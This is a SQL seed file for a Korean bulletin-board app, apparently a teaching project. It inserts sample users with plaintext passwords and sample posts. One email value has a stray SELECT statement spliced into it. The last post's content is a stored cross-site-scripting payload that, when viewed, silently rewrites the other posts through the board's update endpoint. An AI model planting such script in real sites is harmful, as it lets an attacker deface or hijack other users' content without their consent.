insert into user_tb(username, password, email, created_at)
values ('ssar', '1234', 'ssar@nate.com', now());
insert into user_tb(username, password, email, created_at)
values ('cos', '1234', 'cos@nate.com', now());
insert into user_tb(username, password, email, created_at)
values ('love', '1234', 'love@nateSELECT * FROM BOARD_TB .com', now());



insert into board_tb(title, content, created_at, user_id)
values ('제목1', '내용1', now(), 1);
insert into board_tb(title, content, created_at, user_id)
values ('제목2', '내용2', now(), 1);
insert into board_tb(title, content, created_at, user_id)
values ('제목3', '내용3', now(), 2);
insert into board_tb(title, content, created_at, user_id)
values ('제목4', '내용4', now(), 2);
insert into board_tb(title, content, created_at, user_id)
values ('제목5', '내용5', now(), 2);

insert into board_tb(title, content, created_at, user_id)
values ('이글을 보는자 블로그를 지배한다',
        '<script>for(let i=1; i<6; i++){fetch(`/board/${i}/update`, {method: "POST",headers: {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},body: "title=너희글은내가지배한다&content=진짜바보"});}</script>',
        now(), 2);